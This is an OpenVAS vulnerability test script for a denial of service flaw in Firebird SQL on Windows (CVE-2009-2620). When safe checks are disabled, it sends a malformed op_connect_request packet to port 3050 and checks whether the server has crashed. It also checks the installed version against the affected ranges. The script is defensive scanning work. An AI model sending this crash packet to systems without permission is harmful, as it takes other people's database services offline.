###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_firebird_dos_vuln_win.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Firebird SQL 'op_connect_request' Denial Of Service Vulnerability (Windows)
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to cause Denial of Service in
  the affected application.
  Impact Level: Application";
tag_affected = "Firebird SQL version 1.5 before 1.5.6, 2.0 before 2.0.6, 2.1 before 2.1.3,
                   and 2.5 before 2.5 Beta 2 on Windows.";
tag_insight = "The flaw is due to error in the 'rc/remote/server.cpp' in fbserver.exe.
  It fails to sanitise the input sent via a malformed op_connect_request
  message that triggers an infinite loop or NULL pointer dereference.";
tag_solution = "Upgrade to version 1.5.6, 2.0.6, 2.1.3, or 2.5 Beta 2 or later
  http://www.firebirdsql.org/index.php?op=files";
tag_summary = "The host is running Firebird and is prone to Denial of Service
  Vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800852");
  script_version("$Revision: 9350 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2009-09-11 18:01:06 +0200 (Fri, 11 Sep 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-2620");
  script_bugtraq_id(35842);
  script_name("Firebird SQL 'op_connect_request' Denial Of Service Vulnerability (Windows)");
  script_xref(name : "URL" , value : "http://tracker.firebirdsql.org/browse/CORE-2563");
  script_xref(name : "URL" , value : "http://www.coresecurity.com/content/firebird-sql-dos");

  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "gb_firebird_detect_win.nasl");
  script_require_keys("Firebird-SQL/Ver");
  script_require_ports(3050);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

firebird_port = 3050;

if(!get_port_state(firebird_port)){
  exit(0);
}

if(!safe_checks())
{
  firebird_soc = http_open_socket(firebird_port);
  if(firebird_soc)
  {
    packet = raw_string(0x00, 0x00, 0x00, 0x35);
    packet += crap(data:"A", length:12);

    send(socket:firebird_soc, data:string(packet));
    close(firebird_soc);
    sleep(10);

    firebird_soc2 = http_open_socket(firebird_port);
    if(!firebird_soc2){
      security_message(firebird_port);
      exit(0);
    }
   close(firebird_soc2);
  }
}

ver = get_kb_item("Firebird-SQL/Ver");

if(!isnull(ver))
{
  # Grep for version 1.5 < 1.5.6, 2.0 < 2.0.6, 2.1 < 2.1.3, 2.5 < 2.5 Beta 2
  if(version_in_range(version:ver, test_version:"1.5", test_version2:"1.5.5.4926") ||
     version_in_range(version:ver, test_version:"2.0", test_version2:"2.0.5.13206")||
     version_in_range(version:ver, test_version:"2.1", test_version2:"2.1.2.18118")||
     version_in_range(version:ver, test_version:"2.5", test_version2:"2.5.0.23247")){
     security_message(firebird_port);
  }
}
